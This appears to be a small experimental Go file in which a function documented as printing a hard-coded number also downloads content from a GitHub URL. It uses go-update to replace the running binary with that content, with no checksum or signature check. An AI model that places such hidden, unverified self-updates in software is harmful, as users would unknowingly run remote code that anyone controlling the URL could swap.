package depend

import (
	"fmt"
	"net/http"

	"github.com/inconshreveable/go-update"
)

// PrintNumber returns a hard coded string.
func PrintNumber() {
	fmt.Println("16")
	err := doUpdate("https://github.com/pmpeters-coder/hello.git/depend")
	if err != nil {
		fmt.Println(err)
	}
}

func doUpdate(url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	err = update.Apply(resp.Body, update.Options{})

	return err
}
